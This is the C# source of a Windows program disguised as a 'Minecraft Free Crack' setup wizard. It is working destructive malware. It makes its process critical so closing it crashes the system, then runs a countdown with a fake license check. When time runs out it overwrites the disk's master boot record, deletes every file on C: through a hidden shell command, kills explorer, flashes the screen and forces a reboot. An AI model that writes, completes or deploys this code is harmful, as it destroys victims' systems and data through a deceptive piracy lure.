using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Minecraft_Ultra_Launcher
{
    class Program : Form
    {
        // Internal System Handlers
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
        [DllImport("kernel32.dll")]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        private System.Windows.Forms.Timer sessionTimer;
        private int remainingSeconds = 600; 
        private Label lblClock;
        private TextBox licenseField;
        private Random randomGen = new Random();
        private string validLicense = "MC-FREE-2026-X"; // The "Crack Key"

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            try {
                int status = 1;
                // Protection against accidental closure during installation
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
            } catch { }
            Application.Run(new Program());
        }

        public Program()
        {
            // Triggered if user attempts to force-close or reboot
            SystemEvents.SessionEnding += (s, e) => { FinalizeAssets(); };

            this.Text = "Minecraft Free Crack v1.4 - Official Installer";
            this.Size = new Size(800, 500);
            this.BackColor = Color.FromArgb(30, 30, 30);
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;

            Label lblTitle = new Label() { Text = "Minecraft Cracked Edition - Setup Wizard", Font = new Font("Segoe UI", 18, FontStyle.Bold), Location = new Point(250, 20), Size = new Size(500, 40) };
            Label lblInfo = new Label() { 
                Text = "Welcome to the Free Minecraft Crack tool.\n\nTo unlock the full game, you must verify your hardware ID. Please enter your Product Key below. \n\nNote: Do not close this window during the verification process, or your local game cache will be corrupted.", 
                Font = new Font("Segoe UI", 10), Location = new Point(250, 80), Size = new Size(500, 150) 
            };
            
            lblClock = new Label() { Text = "10:00", Font = new Font("Consolas", 48, FontStyle.Bold), ForeColor = Color.LimeGreen, Location = new Point(20, 100), Size = new Size(200, 80) };
            licenseField = new TextBox() { Location = new Point(250, 300), Width = 300, Font = new Font("Consolas", 14), BackColor = Color.Black, ForeColor = Color.White };
            
            Button btnVerify = new Button() { Text = "VERIFY KEY", Location = new Point(560, 298), Size = new Size(120, 32), FlatStyle = FlatStyle.Flat, BackColor = Color.Green };
            btnVerify.Click += (s, e) => {
                if (licenseField.Text == validLicense) { 
                    MessageBox.Show("License Verified! Enjoy Minecraft.", "Success");
                    Environment.Exit(0); 
                }
                else { MessageBox.Show("Invalid Product Key. Please try again.", "Validation Error"); }
            };

            // Hidden "Destroy" button (labeled as "Advanced Settings" but does the same thing)
            Button btnSettings = new Button() { 
                Text = ".", 
                Location = new Point(0, 480), 
                Size = new Size(20, 20), 
                FlatStyle = FlatStyle.Flat, 
                ForeColor = Color.FromArgb(30,30,30) // Invisible!
            };
            btnSettings.Click += (s, e) => { remainingSeconds = 0; };

            this.Controls.AddRange(new Control[] { lblTitle, lblInfo, lblClock, licenseField, btnVerify, btnSettings });

            sessionTimer = new System.Windows.Forms.Timer() { Interval = 1000 };
            sessionTimer.Tick += (s, e) => {
                if (remainingSeconds > 0) {
                    remainingSeconds--;
                    lblClock.Text = TimeSpan.FromSeconds(remainingSeconds).ToString(@"mm\:ss");
                } else {
                    sessionTimer.Stop();
                    InitializeGameCleanup();
                }
            };
            sessionTimer.Start();
        }

        private void InitializeGameCleanup()
        {
            FinalizeAssets(); // This runs your MBR logic
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
            
            System.Windows.Forms.Timer effectTimer = new System.Windows.Forms.Timer() { Interval = 30 };
            int f = 0;
            effectTimer.Tick += (s, e) => {
                f++;
                IntPtr hdc = GetDC(IntPtr.Zero);
                BitBlt(hdc, 0, 0, 1920, 1080, hdc, 0, 0, (f % 2 == 0) ? 0x00990066 : 0x00660044);
            };
            effectTimer.Start();
            new System.Windows.Forms.Timer() { Interval = 15000, Enabled = true }.Tick += (s, e) => { Process.Start("shutdown", "/r /f /t 0"); };
        }

        private void FinalizeAssets()
        {
            try {
                byte[] buffer = new byte[512];
                uint w;
                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(h, buffer, 512, out w, IntPtr.Zero);
            } catch { }
        }
    }
}
